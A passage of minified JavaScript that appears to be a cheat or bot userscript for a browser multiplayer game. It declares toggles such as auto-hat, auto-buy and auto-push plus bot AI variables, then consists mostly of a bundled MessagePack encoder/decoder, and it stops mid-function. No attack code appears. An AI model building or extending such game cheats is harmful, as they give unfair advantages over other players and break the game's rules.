    Mitocondria = {ID: null, player: null},


    botDist = 200,
    placeIndicator = [],
    muteList = [],
    allWeapons = [],
 
    nightMode = true,
    WC = [],
    placeTickInAdvance = 0,
    botMsg = null,
    logMsgs = false,
  
   
    placeDelay = 111,
    stopnbreak = [],
    boostOT = false,
    tempOrigin = false,
    forceHat = null,
    originPoint = {x:null,y:null},
    formationArr = [],
    tempVisual = [],
    fixingWs = [],
    didEquip = 0,
    breakObjs = [],
    znCache = new Map(),
    VnCache = new Map(),
    stackedText = [],
    stackedHealVal = 0,
    socketer,
    moostafaAI,
    moofieAI,
    treasureAI;
   



let nearSpikes = [], nearTraps = [], nearEnemies = [];
let prioLoc = [], replaceLoc = [];
const isDupe = (obj, array) => array.some(item => item.sid === obj.sid);
// caching = faster



const zm = document.getElementById("autohat");
const strictSoldier = document.getElementById("AutoBuy");
const placeAccuracy = document.getElementById("AutoQ food interval");

const kbVisual = document.getElementById("spike kb visual");

const aPush = document.getElementById("auto push");








(function() {
    const t = document.createElement("link").relList;
    if (t && t.supports && t.supports("modulepreload"))
        return;
    for (const n of document.querySelectorAll('link[rel="modulepreload"]'))
        s(n);
    new MutationObserver(n=>{
        for (const r of n)
            if (r.type === "childList")
                for (const o of r.addedNodes)
                    o.tagName === "LINK" && o.rel === "modulepreload" && s(o)
    }
                        ).observe(document, {
        childList: !0,
        subtree: !0
    });
    function i(n) {
        const r = {};
        return n.integrity && (r.integrity = n.integrity),
            n.referrerpolicy && (r.referrerPolicy = n.referrerpolicy),
            n.crossorigin === "use-credentials" ? r.credentials = "include" : n.crossorigin === "anonymous" ? r.credentials = "omit" : r.credentials = "same-origin",
            r
    }
    function s(n) {
        if (n.ep)
            return;
        n.ep = !0;
        const r = i(n);
        fetch(n.href, r)
    }
}
)();
var Ke = 4294967295;
function Ko(e, t, i) {
    var s = i / 4294967296
    , n = i;
    e.setUint32(t, s),
        e.setUint32(t + 4, n)
}
function Br(e, t, i) {
    var s = floor(i / 4294967296)
    , n = i;
    e.setUint32(t, s),
        e.setUint32(t + 4, n)
}
function zr(e, t) {
    var i = e.getInt32(t)
    , s = e.getUint32(t + 4);
    return i * 4294967296 + s
}
function Jo(e, t) {
    var i = e.getUint32(t)
    , s = e.getUint32(t + 4);
    return i * 4294967296 + s
}
var Gi, Yi, $i, Pi = (typeof process > "u" || ((Gi = process == null ? void 0 : process.env) === null || Gi === void 0 ? void 0 : Gi.TEXT_ENCODING) !== "never") && typeof TextEncoder < "u" && typeof TextDecoder < "u";
function Cs(e) {
    for (var t = e.length, i = 0, s = 0; s < t; ) {
        var n = e.charCodeAt(s++);
        if (n & 4294967168)
            if (!(n & 4294965248))
                i += 2;
            else {
                if (n >= 55296 && n <= 56319 && s < t) {
                    var r = e.charCodeAt(s);
                    (r & 64512) === 56320 && (++s,
                                              n = ((n & 1023) << 10) + (r & 1023) + 65536)
                }
                n & 4294901760 ? i += 4 : i += 3
            }
        else {
            i++;
            continue
        }
    }
    return i
}
function Qo(e, t, i) {
    for (var s = e.length, n = i, r = 0; r < s; ) {
        var o = e.charCodeAt(r++);
        if (o & 4294967168)
            if (!(o & 4294965248))
                t[n++] = o >> 6 & 31 | 192;
            else {
                if (o >= 55296 && o <= 56319 && r < s) {
                    var l = e.charCodeAt(r);
                    (l & 64512) === 56320 && (++r,
                                              o = ((o & 1023) << 10) + (l & 1023) + 65536)
                }
                o & 4294901760 ? (t[n++] = o >> 18 & 7 | 240,
                                  t[n++] = o >> 12 & 63 | 128,
                                  t[n++] = o >> 6 & 63 | 128) : (t[n++] = o >> 12 & 15 | 224,
                                                                 t[n++] = o >> 6 & 63 | 128)
            }
        else {
            t[n++] = o;
            continue
        }
        t[n++] = o & 63 | 128
    }
}
var Ut = Pi ? new TextEncoder : void 0
, Zo = Pi ? typeof process < "u" && ((Yi = process == null ? void 0 : process.env) === null || Yi === void 0 ? void 0 : Yi.TEXT_ENCODING) !== "force" ? 200 : 0 : Ke;
function jo(e, t, i) {
    t.set(Ut.encode(e), i)
}
function ea(e, t, i) {
    Ut.encodeInto(e, t.subarray(i))
}
var ta = Ut != null && Ut.encodeInto ? ea : jo
, ia = 4096;
function Hr(e, t, i) {
    for (var s = t, n = s + i, r = [], o = ""; s < n; ) {
        var l = e[s++];
        if (!(l & 128))
            r.push(l);
        else if ((l & 224) === 192) {
            var c = e[s++] & 63;
            r.push((l & 31) << 6 | c)
        } else if ((l & 240) === 224) {
            var c = e[s++] & 63
            , a = e[s++] & 63;
            r.push((l & 31) << 12 | c << 6 | a)
        } else if ((l & 248) === 240) {
            var c = e[s++] & 63
            , a = e[s++] & 63
            , u = e[s++] & 63
            , p = (l & 7) << 18 | c << 12 | a << 6 | u;
            p > 65535 && (p -= 65536,
                          r.push(p >>> 10 & 1023 | 55296),
                          p = 56320 | p & 1023),
                r.push(p)
        } else
            r.push(l);
        r.length >= ia && (o += String.fromCharCode.apply(String, r),
                           r.length = 0)
    }
    return r.length > 0 && (o += String.fromCharCode.apply(String, r)),
        o
}
var na = Pi ? new TextDecoder : null
, sa = Pi ? typeof process < "u" && (($i = process == null ? void 0 : process.env) === null || $i === void 0 ? void 0 : $i.TEXT_DECODER) !== "force" ? 200 : 0 : Ke;
function ra(e, t, i) {
    var s = e.subarray(t, t + i);
    return na.decode(s)
}
var si = function() {
    function e(t, i) {
        this.type = t,
            this.data = i
    }
    return e
}()
, oa = globalThis && globalThis.__extends || function() {
    var e = function(t, i) {
        return e = Object.setPrototypeOf || {
            __proto__: []
        }instanceof Array && function(s, n) {
            s.__proto__ = n
        }
        || function(s, n) {
            for (var r in n)
                Object.prototype.hasOwnProperty.call(n, r) && (s[r] = n[r])
        }
            ,
            e(t, i)
    };
    return function(t, i) {
        if (typeof i != "function" && i !== null)
            throw new TypeError("Class extends value " + String(i) + " is not a constructor or null");
        e(t, i);
        function s() {
            this.constructor = t
        }
        t.prototype = i === null ? Object.create(i) : (s.prototype = i.prototype,
                                                       new s)
    }
}()
, Pe = function(e) {
    oa(t, e);
    function t(i) {
        var s = e.call(this, i) || this
        , n = Object.create(t.prototype);
        return Object.setPrototypeOf(s, n),
            Object.defineProperty(s, "name", {
            configurable: !0,
            enumerable: !1,
            value: t.name
        }),
            s
    }
    return t
}(Error)
, aa = -1
, la = 4294967296 - 1
, ca = 17179869184 - 1;
function ha(e) {
    var t = e.sec
    , i = e.nsec;
    if (t >= 0 && i >= 0 && t <= ca)
        if (i === 0 && t <= la) {
            var s = new Uint8Array(4)
            , n = new DataView(s.buffer);
            return n.setUint32(0, t),
                s
        } else {
            var r = t / 4294967296
            , o = t & 4294967295
            , s = new Uint8Array(8)
            , n = new DataView(s.buffer);
            return n.setUint32(0, i << 2 | r & 3),
                n.setUint32(4, o),
                s
        }
    else {
        var s = new Uint8Array(12)
        , n = new DataView(s.buffer);
        return n.setUint32(0, i),
            Br(n, 4, t),
            s
    }
}
function fa(e) {
    var t = e.getTime()
    , i = floor(t / 1e3)
    , s = (t - i * 1e3) * 1e6
    , n = floor(s / 1e9);
    return {
        sec: i + n,
        nsec: s - n * 1e9
    }
}
function ua(e) {
    if (e instanceof Date) {
        var t = fa(e);
        return ha(t)
    } else
        return null
}
function da(e) {
    var t = new DataView(e.buffer,e.byteOffset,e.byteLength);
    switch (e.byteLength) {
        case 4:
            {
                var i = t.getUint32(0)
                , s = 0;
                return {
                    sec: i,
                    nsec: s
                }
            }
        case 8:
            {
                var n = t.getUint32(0)
                , r = t.getUint32(4)
                , i = (n & 3) * 4294967296 + r
                , s = n >>> 2;
                return {
                    sec: i,
                    nsec: s
                }
            }
        case 12:
            {
                var i = zr(t, 4)
                , s = t.getUint32(0);
                return {
                    sec: i,
                    nsec: s
                }
            }
        default:
            throw new Pe("Unrecognized data size for timestamp (expected 4, 8, or 12): ".concat(e.length))
    }
}
function pa(e) {
    var t = da(e);
    return new Date(t.sec * 1e3 + t.nsec / 1e6)
}
var ma = {
    type: aa,
    encode: ua,
    decode: pa
}
, Fr = function() {
    function e() {
        this.builtInEncoders = [],
            this.builtInDecoders = [],
            this.encoders = [],
            this.decoders = [],
            this.register(ma)
    }
    return e.prototype.register = function(t) {
        var i = t.type
        , s = t.encode
        , n = t.decode;
        if (i >= 0)
            this.encoders[i] = s,
                this.decoders[i] = n;
        else {
            var r = 1 + i;
            this.builtInEncoders[r] = s,
                this.builtInDecoders[r] = n
        }
    }
        ,
        e.prototype.tryToEncode = function(t, i) {
        for (var s = 0; s < this.builtInEncoders.length; s++) {
            var n = this.builtInEncoders[s];
            if (n != null) {
                var r = n(t, i);
                if (r != null) {
                    var o = -1 - s;
                    return new si(o,r)
                }
            }
        }
        for (var s = 0; s < this.encoders.length; s++) {
            var n = this.encoders[s];
            if (n != null) {
                var r = n(t, i);
                if (r != null) {
                    var o = s;
                    return new si(o,r)
                }
            }
        }
        return t instanceof si ? t : null
    }
        ,
        e.prototype.decode = function(t, i, s) {
        var n = i < 0 ? this.builtInDecoders[-1 - i] : this.decoders[i];
        return n ? n(t, i, s) : new si(i,t)
    }
        ,
        e.defaultCodec = new e,
        e
}();
function gi(e) {
    return e instanceof Uint8Array ? e : ArrayBuffer.isView(e) ? new Uint8Array(e.buffer,e.byteOffset,e.byteLength) : e instanceof ArrayBuffer ? new Uint8Array(e) : Uint8Array.from(e)
}
function ga(e) {
    if (e instanceof ArrayBuffer)
        return new DataView(e);
    var t = gi(e);
    return new DataView(t.buffer,t.byteOffset,t.byteLength)
}
var ya = 100
, wa = 2048
, ka = function() {
    function e(t, i, s, n, r, o, l, c) {
        t === void 0 && (t = Fr.defaultCodec),
            i === void 0 && (i = void 0),
            s === void 0 && (s = ya),
            n === void 0 && (n = wa),
            r === void 0 && (r = !1),
            o === void 0 && (o = !1),
            l === void 0 && (l = !1),
            c === void 0 && (c = !1),
            this.extensionCodec = t,
            this.context = i,
            this.maxDepth = s,
            this.initialBufferSize = n,
            this.sortKeys = r,
            this.forceFloat32 = o,
            this.ignoreUndefined = l,
            this.forceIntegerToFloat = c,
            this.pos = 0,
            this.view = new DataView(new ArrayBuffer(this.initialBufferSize)),
            this.bytes = new Uint8Array(this.view.buffer)
    }
    return e.prototype.reinitializeState = function() {
        this.pos = 0
    }
        ,
        e.prototype.encodeSharedRef = function(t) {
        return this.reinitializeState(),
            this.doEncode(t, 1),
            this.bytes.subarray(0, this.pos)
    }
        ,
        e.prototype.encode = function(t) {
        return this.reinitializeState(),
            this.doEncode(t, 1),
            this.bytes.slice(0, this.pos)
    }
        ,
        e.prototype.doEncode = function(t, i) {
        if (i > this.maxDepth)
            throw new Error("Too deep objects in depth ".concat(i));
        t == null ? this.encodeNil() : typeof t == "boolean" ? this.encodeBoolean(t) : typeof t == "number" ? this.encodeNumber(t) : typeof t == "string" ? this.encodeString(t) : this.encodeObject(t, i)
    }
        ,
        e.prototype.ensureBufferSizeToWrite = function(t) {
        var i = this.pos + t;
        this.view.byteLength < i && this.resizeBuffer(i * 2)
    }
        ,
        e.prototype.resizeBuffer = function(t) {
        var i = new ArrayBuffer(t)
        , s = new Uint8Array(i)
        , n = new DataView(i);
        s.set(this.bytes),
            this.view = n,
            this.bytes = s
    }
        ,
        e.prototype.encodeNil = function() {
        this.writeU8(192)
    }
        ,
        e.prototype.encodeBoolean = function(t) {
        t === !1 ? this.writeU8(194) : this.writeU8(195)
    }
        ,
        e.prototype.encodeNumber = function(t) {
        Number.isSafeInteger(t) && !this.forceIntegerToFloat ? t >= 0 ? t < 128 ? this.writeU8(t) : t < 256 ? (this.writeU8(204),
                                                                                                               this.writeU8(t)) : t < 65536 ? (this.writeU8(205),
                                                                                                                                               this.writeU16(t)) : t < 4294967296 ? (this.writeU8(206),
        this.writeU32(t)) : (this.writeU8(207),
                             this.writeU64(t)) : t >= -32 ? this.writeU8(224 | t + 32) : t >= -128 ? (this.writeU8(208),
                                                                                                      this.writeI8(t)) : t >= -32768 ? (this.writeU8(209),
                                                                                                                                        this.writeI16(t)) : t >= -2147483648 ? (this.writeU8(210),
        this.writeI32(t)) : (this.writeU8(211),
                             this.writeI64(t)) : this.forceFloat32 ? (this.writeU8(202),
                                                                      this.writeF32(t)) : (this.writeU8(203),
                                                                                           this.writeF64(t))
    }
        ,
        e.prototype.writeStringHeader = function(t) {
        if (t < 32)
            this.writeU8(160 + t);
        else if (t < 256)
            this.writeU8(217),
                this.writeU8(t);
        else if (t < 65536)
            this.writeU8(218),
                this.writeU16(t);
        else if (t < 4294967296)
            this.writeU8(219),
                this.writeU32(t);
        else
            throw new Error("Too long string: ".concat(t, " bytes in UTF-8"))
    }
        ,
        e.prototype.encodeString = function(t) {
        var i = 5
        , s = t.length;
        if (s > Zo) {
            var n = Cs(t);
            this.ensureBufferSizeToWrite(i + n),
                this.writeStringHeader(n),
                ta(t, this.bytes, this.pos),
                this.pos += n
        } else {
            var n = Cs(t);
            this.ensureBufferSizeToWrite(i + n),
                this.writeStringHeader(n),
                Qo(t, this.bytes, this.pos),
                this.pos += n
        }
    }
        ,
        e.prototype.encodeObject = function(t, i) {
        var s = this.extensionCodec.tryToEncode(t, this.context);
        if (s != null)
            this.encodeExtension(s);
        else if (Array.isArray(t))
            this.encodeArray(t, i);
        else if (ArrayBuffer.isView(t))
            this.encodeBinary(t);
        else if (typeof t == "object")
            this.encodeMap(t, i);
        else
            throw new Error("Unrecognized object: ".concat(Object.prototype.toString.apply(t)))
    }
        ,
        e.prototype.encodeBinary = function(t) {
        var i = t.byteLength;
        if (i < 256)
            this.writeU8(196),
                this.writeU8(i);
        else if (i < 65536)
            this.writeU8(197),
                this.writeU16(i);
        else if (i < 4294967296)
            this.writeU8(198),
                this.writeU32(i);
        else
            throw new Error("Too large binary: ".concat(i));
        var s = gi(t);
        this.writeU8a(s)
    }
        ,
        e.prototype.encodeArray = function(t, i) {
        var s = t.length;
        if (s < 16)
            this.writeU8(144 + s);
        else if (s < 65536)
            this.writeU8(220),
                this.writeU16(s);
        else if (s < 4294967296)
            this.writeU8(221),
                this.writeU32(s);
        else
            throw new Error("Too large array: ".concat(s));
        for (var n = 0, r = t; n < r.length; n++) {
            var o = r[n];
            this.doEncode(o, i + 1)
        }
    }
        ,
        e.prototype.countWithoutUndefined = function(t, i) {
        for (var s = 0, n = 0, r = i; n < r.length; n++) {
            var o = r[n];
            t[o] !== void 0 && s++
        }
        return s
    }
        ,

        e.prototype.encodeMap = function(t, i) {
        var s = Object.keys(t);
        this.sortKeys && s.sort();
        var n = this.ignoreUndefined ? this.countWithoutUndefined(t, s) : s.length;
        if (n < 16)
            this.writeU8(128 + n);
        else if (n < 65536)
            this.writeU8(222),
                this.writeU16(n);
        else if (n < 4294967296)
            this.writeU8(223),
                this.writeU32(n);
        else
            throw new Error("Too large map object: ".concat(n));
        for (var r = 0, o = s; r < o.length; r++) {
            var l = o[r]
            , c = t[l];
            this.ignoreUndefined && c === void 0 || (this.encodeString(l),
                                                     this.doEncode(c, i + 1))
        }
    }
        ,
        e.prototype.encodeExtension = function(t) {
        var i = t.data.length;
        if (i === 1)
            this.writeU8(212);
        else if (i === 2)
            this.writeU8(213);
        else if (i === 4)
            this.writeU8(214);
        else if (i === 8)
            this.writeU8(215);
        else if (i === 16)
            this.writeU8(216);
        else if (i < 256)
            this.writeU8(199),
                this.writeU8(i);
        else if (i < 65536)
            this.writeU8(200),
                this.writeU16(i);
        else if (i < 4294967296)
            this.writeU8(201),
                this.writeU32(i);
        else
            throw new Error("Too large extension object: ".concat(i));
        this.writeI8(t.type),
            this.writeU8a(t.data)
    }
        ,
        e.prototype.writeU8 = function(t) {
        this.ensureBufferSizeToWrite(1),
            this.view.setUint8(this.pos, t),
            this.pos++
    }
        ,
        e.prototype.writeU8a = function(t) {
        var i = t.length;
        this.ensureBufferSizeToWrite(i),
            this.bytes.set(t, this.pos),
            this.pos += i
    }
        ,
        e.prototype.writeI8 = function(t) {
        this.ensureBufferSizeToWrite(1),
            this.view.setInt8(this.pos, t),
            this.pos++
    }
        ,
        e.prototype.writeU16 = function(t) {
        this.ensureBufferSizeToWrite(2),
            this.view.setUint16(this.pos, t),
            this.pos += 2
    }
        ,
        e.prototype.writeI16 = function(t) {
        this.ensureBufferSizeToWrite(2),
            this.view.setInt16(this.pos, t),
            this.pos += 2
    }
        ,
        e.prototype.writeU32 = function(t) {
        this.ensureBufferSizeToWrite(4),
            this.view.setUint32(this.pos, t),
            this.pos += 4
    }
        ,
        e.prototype.writeI32 = function(t) {
        this.ensureBufferSizeToWrite(4),
            this.view.setInt32(this.pos, t),
            this.pos += 4
    }
        ,
        e.prototype.writeF32 = function(t) {
        this.ensureBufferSizeToWrite(4),
            this.view.setFloat32(this.pos, t),
            this.pos += 4
    }
        ,
        e.prototype.writeF64 = function(t) {
        this.ensureBufferSizeToWrite(8),
            this.view.setFloat64(this.pos, t),
            this.pos += 8
    }
        ,
        e.prototype.writeU64 = function(t) {
        this.ensureBufferSizeToWrite(8),
            Ko(this.view, this.pos, t),
            this.pos += 8
    }
        ,
        e.prototype.writeI64 = function(t) {
        this.ensureBufferSizeToWrite(8),
            Br(this.view, this.pos, t),
            this.pos += 8
    }
        ,
        e
}();
function Ki(e) {
    return "".concat(e < 0 ? "-" : "", "0x").concat(abs(e).toString(16).padStart(2, "0"))
}
var va = 16, xa = 16, ba = function() {
    function e(t, i) {
        t === void 0 && (t = va),
            i === void 0 && (i = xa),
            this.maxKeyLength = t,
            this.maxLengthPerKey = i,
            this.hit = 0,
            this.miss = 0,
            this.caches = [];
        for (var s = 0; s < this.maxKeyLength; s++)
            this.caches.push([])
    }
    return e.prototype.canBeCached = function(t) {
        return t > 0 && t <= this.maxKeyLength
    }
        ,
        e.prototype.find = function(t, i, s) {
        var n = this.caches[s - 1];
        e: for (var r = 0, o = n; r < o.length; r++) {
            for (var l = o[r], c = l.bytes, a = 0; a < s; a++)
                if (c[a] !== t[i + a])
                    continue e;
            return l.str
        }
        return null
    }
        ,
        e.prototype.store = function(t, i) {
        var s = this.caches[t.length - 1]
        , n = {
            bytes: t,
            str: i
        };
        s.length >= this.maxLengthPerKey ? s[Math.random() * s.length | 0] = n : s.push(n)
    }
        ,
        e.prototype.decode = function(t, i, s) {
        var n = this.find(t, i, s);
        if (n != null)
            return this.hit++,
                n;
        this.miss++;
        var r = Hr(t, i, s)
        , o = Uint8Array.prototype.slice.call(t, i, i + s);
        return this.store(o, r),
            r
    }
        ,
        e
}(), Sa = globalThis && globalThis.__awaiter || function(e, t, i, s) {
    function n(r) {
        return r instanceof i ? r : new i(function(o) {
            o(r)
        }
                                         )
    }
    return new (i || (i = Promise))(function(r, o) {
        function l(u) {
            try {
                a(s.next(u))
            } catch (p) {
                o(p)
            }
        }
        function c(u) {
            try {
                a(s.throw(u))
            } catch (p) {
                o(p)
            }
        }
        function a(u) {
            u.done ? r(u.value) : n(u.value).then(l, c)
        }
        a((s = s.apply(e, t || [])).next())
    }
                                   )
}
, Ji = globalThis && globalThis.__generator || function(e, t) {
    var i = {
        label: 0,
        sent: function() {
            if (r[0] & 1)
                throw r[1];
            return r[1]
        },
        trys: [],
        ops: []
    }, s, n, r, o;
    return o = {
        next: l(0),
        throw: l(1),
        return: l(2)
    },
        typeof Symbol == "function" && (o[Symbol.iterator] = function() {
        return this
    }
                                       ),
        o;
    function l(a) {
        return function(u) {
            return c([a, u])
        }
    }
    function c(a) {
        if (s)
            throw new TypeError("Generator is already executing.");
        for (; i; )
            try {
                if (s = 1,
                    n && (r = a[0] & 2 ? n.return : a[0] ? n.throw || ((r = n.return) && r.call(n),
                                                                       0) : n.next) && !(r = r.call(n, a[1])).done)
                    return r;
                switch (n = 0,
                        r && (a = [a[0] & 2, r.value]),
                        a[0]) {
                    case 0:
                    case 1:
                        r = a;
                        break;
                    case 4:
                        return i.label++,
                            {
                            value: a[1],
                            done: !1
                        };
                    case 5:
                        i.label++,
                            n = a[1],
                            a = [0];
                        continue;
                    case 7:
                        a = i.ops.pop(),
                            i.trys.pop();
                        continue;
                    default:
                        if (r = i.trys,
                            !(r = r.length > 0 && r[r.length - 1]) && (a[0] === 6 || a[0] === 2)) {
                            i = 0;
                            continue
                        }
                        if (a[0] === 3 && (!r || a[1] > r[0] && a[1] < r[3])) {
                            i.label = a[1];
                            break
                        }
                        if (a[0] === 6 && i.label < r[1]) {
                            i.label = r[1],
                                r = a;
                            break
                        }
                        if (r && i.label < r[2]) {
                            i.label = r[2],
                                i.ops.push(a);
                            break
                        }
                        r[2] && i.ops.pop(),
                            i.trys.pop();
                        continue
                }
                a = t.call(e, i)
            } catch (u) {
                a = [6, u],
                    n = 0
            } finally {
                s = r = 0
            }
        if (a[0] & 5)
            throw a[1];
        return {
            value: a[0] ? a[1] : void 0,
            done: !0
        }
    }
}
, As = globalThis && globalThis.__asyncValues || function(e) {
    if (!Symbol.asyncIterator)
        throw new TypeError("Symbol.asyncIterator is not defined.");
    var t = e[Symbol.asyncIterator], i;
    return t ? t.call(e) : (e = typeof __values == "function" ? __values(e) : e[Symbol.iterator](),
                            i = {},
                            s("next"),
                            s("throw"),
                            s("return"),
                            i[Symbol.asyncIterator] = function() {
        return this
    }
                            ,
                            i);
    function s(r) {
        i[r] = e[r] && function(o) {
            return new Promise(function(l, c) {
                o = e[r](o),
                    n(l, c, o.done, o.value)
            }
                              )
        }
    }
    function n(r, o, l, c) {
        Promise.resolve(c).then(function(a) {
            r({
                value: a,
                done: l
            })
        }, o)
    }
}
, St = globalThis && globalThis.__await || function(e) {
    return this instanceof St ? (this.v = e,
                                 this) : new St(e)
}
, Ta = globalThis && globalThis.__asyncGenerator || function(e, t, i) {
    if (!Symbol.asyncIterator)
        throw new TypeError("Symbol.asyncIterator is not defined.");
    var s = i.apply(e, t || []), n, r = [];
    return n = {},
        o("next"),
        o("throw"),
        o("return"),
        n[Symbol.asyncIterator] = function() {
        return this
    }
        ,
        n;
    function o(h) {
        s[h] && (n[h] = function(m) {
            return new Promise(function(w, v) {
                r.push([h, m, w, v]) > 1 || l(h, m)
            }
                              )
        }
                )
    }
    function l(h, m) {
        try {
            c(s[h](m))
        } catch (w) {
            p(r[0][3], w)
        }
    }
    function c(h) {
        h.value instanceof St ? Promise.resolve(h.value.v).then(a, u) : p(r[0][2], h)
    }
    function a(h) {
        l("next", h)
    }
    function u(h) {
        l("throw", h)
    }
    function p(h, m) {
        h(m),
            r.shift(),
            r.length && l(r[0][0], r[0][1])
    }
}
, Ia = function(e) {
    var t = typeof e;
    return t === "string" || t === "number"
}, Dt = -1, es = new DataView(new ArrayBuffer(0)), Ma = new Uint8Array(es.buffer), Cn = function() {
    try {
        es.getInt8(0)
    } catch (e) {
        return e.constructor
    }
    throw new Error("never reached")
}(), Ds = new Cn("Insufficient data"), Ea = new ba, Pa = function() {
    function e(t, i, s, n, r, o, l, c) {
        t === void 0 && (t = Fr.defaultCodec),
            i === void 0 && (i = void 0),
            s === void 0 && (s = Ke),
            n === void 0 && (n = Ke),
            r === void 0 && (r = Ke),
            o === void 0 && (o = Ke),
            l === void 0 && (l = Ke),
            c === void 0 && (c = Ea),
            this.extensionCodec = t,
            this.context = i,
            this.maxStrLength = s,
            this.maxBinLength = n,
            this.maxArrayLength = r,
            this.maxMapLength = o,
            this.maxExtLength = l,
            this.keyDecoder = c,
            this.totalPos = 0,
            this.pos = 0,
            this.view = es,
            this.bytes = Ma,
            this.headByte = Dt,
            this.stack = []
    }
    return e.prototype.reinitializeState = function() {
        this.totalPos = 0,
            this.headByte = Dt,
            this.stack.length = 0
    }
        ,
        e.prototype.setBuffer = function(t) {
        this.bytes = gi(t),
            this.view = ga(this.bytes),
            this.pos = 0
    }
        ,
        e.prototype.appendBuffer = function(t) {
        if (this.headByte === Dt && !this.hasRemaining(1))
            this.setBuffer(t);
        else {
            var i = this.bytes.subarray(this.pos)
            , s = gi(t)
            , n = new Uint8Array(i.length + s.length);
            n.set(i),
                n.set(s, i.length),
                this.setBuffer(n)
        }
    }
        ,
        e.prototype.hasRemaining = function(t) {
        return this.view.byteLength - this.pos >= t
    }
        ,
        e.prototype.createExtraByteError = function(t) {
        var i = this
        , s = i.view
        , n = i.pos;
        return new RangeError("Extra ".concat(s.byteLength - n, " of ").concat(s.byteLength, " byte(s) found at buffer[").concat(t, "]"))
    }
        ,
        e.prototype.decode = function(t) {
        this.reinitializeState(),
            this.setBuffer(t);
        var i = this.doDecodeSync();
        if (this.hasRemaining(1))
            throw this.createExtraByteError(this.pos);
        return i
    }
        ,
        e.prototype.decodeMulti = function(t) {
        return Ji(this, function(i) {
            switch (i.label) {
                case 0:
                    this.reinitializeState(),
                        this.setBuffer(t),
                        i.label = 1;
                case 1:
                    return this.hasRemaining(1) ? [4, this.doDecodeSync()] : [3, 3];
                case 2:
                    return i.sent(),
                        [3, 1];
                case 3:
                    return [2]
            }
        })
    }
        ,
        e.prototype.decodeAsync = function(t) {
        var i, s, n, r;
        return Sa(this, void 0, void 0, function() {
            var o, l, c, a, u, p, h, m;
            return Ji(this, function(w) {
                switch (w.label) {
                    case 0:
                        o = !1,
                            w.label = 1;
                    case 1:
                        w.trys.push([1, 6, 7, 12]),
                            i = As(t),
                            w.label = 2;
                    case 2:
                        return [4, i.next()];
                    case 3:
                        if (s = w.sent(),
                            !!s.done)
                            return [3, 5];
                        if (c = s.value,
                            o)
                            throw this.createExtraByteError(this.totalPos);
                        this.appendBuffer(c);
                        try {
                            l = this.doDecodeSync(),
                                o = !0
                        } catch (v) {
                            if (!(v instanceof Cn))
                                throw v
                        }
                        this.totalPos += this.pos,
                            w.label = 4;
                    case 4:
                        return [3, 2];
                    case 5:
                        return [3, 12];
                    case 6:
                        return a = w.sent(),
                            n = {
                            error: a
                        },
                            [3, 12];
                    case 7:
                        return w.trys.push([7, , 10, 11]),
                            s && !s.done && (r = i.return) ? [4, r.call(i)] : [3, 9];
                    case 8:
                        w.sent(),
                            w.label = 9;
                    case 9:
                        return [3, 11];
                    case 10:
                        if (n)
                            throw n.error;
                        return [7];
                    case 11:
                        return [7];
                    case 12:
                        if (o) {
                            if (this.hasRemaining(1))
                                throw this.createExtraByteError(this.totalPos);
                            return [2, l]
                        }
                        throw u = this,
                            p = u.headByte,
                            h = u.pos,
                            m = u.totalPos,
                            new RangeError("Insufficient data in parsing ".concat(Ki(p), " at ").concat(m, " (").concat(h, " in the current buffer)"))
                }
            })
        })
    }
        ,
        e.prototype.decodeArrayStream = function(t) {
        return this.decodeMultiAsync(t, !0)
    }
        ,
        e.prototype.decodeStream = function(t) {
        return this.decodeMultiAsync(t, !1)
    }
        ,
        e.prototype.decodeMultiAsync = function(t, i) {
        return Ta(this, arguments, function() {
            var n, r, o, l, c, a, u, p, h;
            return Ji(this, function(m) {
                switch (m.label) {
                    case 0:
                        n = i,
                            r = -1,
                            m.label = 1;
                    case 1:
                        m.trys.push([1, 13, 14, 19]),
                            o = As(t),
                            m.label = 2;
                    case 2:
                        return [4, St(o.next())];
                    case 3:
                        if (l = m.sent(),
                            !!l.done)
                            return [3, 12];
                        if (c = l.value,
                            i && r === 0)
                            throw this.createExtraByteError(this.totalPos);
                        this.appendBuffer(c),
                            n && (r = this.readArraySize(),
                                  n = !1,
                                  this.complete()),
                            m.label = 4;
                    case 4:
                        m.trys.push([4, 9, , 10]),
                            m.label = 5;
                    case 5:
                        return [4, St(this.doDecodeSync())];
                    case 6:
                        return [4, m.sent()];
                    case 7:
                        return m.sent(),
                            --r === 0 ? [3, 8] : [3, 5];
                    case 8:
                        return [3, 10];
                    case 9:
                        if (a = m.sent(),
                            !(a instanceof Cn))
                            throw a;
                        return [3, 10];
                    case 10:
                        this.totalPos += this.pos,
                            m.label = 11;
                    case 11:
                        return [3, 2];
                    case 12:
                        return [3, 19];
                    case 13:
                        return u = m.sent(),
                            p = {
                            error: u
                        },
                            [3, 19];
                    case 14:
                        return m.trys.push([14, , 17, 18]),
                            l && !l.done && (h = o.return) ? [4, St(h.call(o))] : [3, 16];
                    case 15:
                        m.sent(),
                            m.label = 16;
                    case 16:
                        return [3, 18];
                    case 17:
                        if (p)
                            throw p.error;
                        return [7];
                    case 18:
                        return [7];
                    case 19:
                        return [2]
                }
            })
        })
    }
        ,
        e.prototype.doDecodeSync = function() {
        e: for (; ; ) {
            var t = this.readHeadByte()
            , i = void 0;
            if (t >= 224)
                i = t - 256;
            else if (t < 192)
                if (t < 128)
                    i = t;
                else if (t < 144) {
                    var s = t - 128;
                    if (s !== 0) {
                        this.pushMapState(s),
                            this.complete();
                        continue e
                    } else
                        i = {}
                } else if (t < 160) {
                    var s = t - 144;
                    if (s !== 0) {
                        this.pushArrayState(s),
                            this.complete();
                        continue e
                    } else
                        i = []
                } else {
                    var n = t - 160;
                    i = this.decodeUtf8String(n, 0)
                }
            else if (t === 192)
                i = null;
            else if (t === 194)
                i = !1;
            else if (t === 195)
                i = !0;
            else if (t === 202)
                i = this.readF32();
            else if (t === 203)
                i = this.readF64();
            else if (t === 204)
                i = this.readU8();
            else if (t === 205)
                i = this.readU16();
            else if (t === 206)
                i = this.readU32();
            else if (t === 207)
                i = this.readU64();
            else if (t === 208)
                i = this.readI8();
            else if (t === 209)
                i = this.readI16();
            else if (t === 210)
                i = this.readI32();
            else if (t === 211)
                i = this.readI64();
            else if (t === 217) {
                var n = this.lookU8();
                i = this.decodeUtf8String(n, 1)
            } else if (t === 218) {
                var n = this.lookU16();
                i = this.decodeUtf8String(n, 2)
            } else if (t === 219) {
                var n = this.lookU32();
                i = this.decodeUtf8String(n, 4)
            } else if (t === 220) {
                var s = this.readU16();
                if (s !== 0) {
                    this.pushArrayState(s),
                        this.complete();
                    continue e
                } else
                    i = []
            } else if (t === 221) {
                var s = this.readU32();
                if (s !== 0) {
                    this.pushArrayState(s),
                        this.complete();
